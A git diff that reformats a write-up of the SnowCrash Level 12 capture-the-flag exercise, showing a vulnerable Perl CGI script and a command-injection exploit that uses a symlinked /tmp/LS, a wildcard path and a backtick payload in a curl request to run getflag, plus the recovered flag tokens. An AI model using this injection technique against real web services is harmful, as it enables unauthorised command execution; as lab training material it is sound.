@@ -1,7 +1,10 @@
-When we started the level we found a level12.pl.
-=> 
+# SnowCrash Level 12
+
+## Introduction
+When we started the level, we found a `level12.pl` script:
+```
 #!/usr/bin/env perl
-# localhost:4646
+localhost:4646
 use CGI qw{param};
 print "Content-type: text/html\n\n";
 
@@ -29,23 +32,31 @@ sub n {
 }
 
 n(t(param("x"), param("y")));
+```
+## Exploitation
+We easily understood that the security breach is
+```@output = `egrep "^$xx" /tmp/xd 2>&1`;``` 
 
-We can easily understand that the security breach is `@output = `egrep "^$xx" /tmp/xd 2>&1`;`
+We attempted injections, but the regex turned our `ls` to `LS`, causing errors. After a day of research, we tried to execute `/bin/ls` and transfer the result to the error file of Apache in `/var/log/apache2/error.log`. We finally got an error: 
+```
+[Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] /*/LS: not found
+```
+Then, we created a symbolic link between `/bin/ls` and `/tmp/LS`: `ln -s /bin/ls /tmp/LS`. We attempted to execute 
 
-We tried to made some injections but the regex turn our ls to => LS that make some errors .. 
-After one full day of research we tried to exec /bin/ls and to trasnfer the result in the error file of apache in /var/log/apache2/error.log and we finaly get some error to try to debug things : [Thu Feb 08 13:33:52 2024] [error] [client 127.0.0.1] /*/LS: not found.
+```
+curl '127.0.0.1:4646/?x=`/*/ls%3E%262
+```
+This worked, and we got an `LS` in the error log of Apache.
 
-After this we got idea to just make a link beetween /bin/ls and /tmp/LS : ln -s /bin/ls /tmp/LS
-Then trying to execute curl '127.0.0.1:4646/?x=`/*/ls%3E%262`'.
-
-This work, we got an LS in the errorlog of Apache
-
-Do this with Getflag and we finaly get the flag ! cat /var/log/apache2/error.log :
-[Thu Feb 08 13:41:20 2024] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
-
-/*********************************************************\
-
+## Obtaining the Token
+We tried the same with `getflag` and finally got the flag! By reading 
+```
+/var/log/apache2/error.log
+``` 
+We found:
+```
+[Thu Feb 08 13:41:20 2024] [error] [client 127.0.0.1] Check flag. Here is your token: g1qKMiRpXf53AWhDaU7FEkczr
 flag12@SnowCrash:~$ getflag
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+Check flag. Here is your token: fa6v5ateaw21peobuub8ipe6s
+```
 
-\*********************************************************/
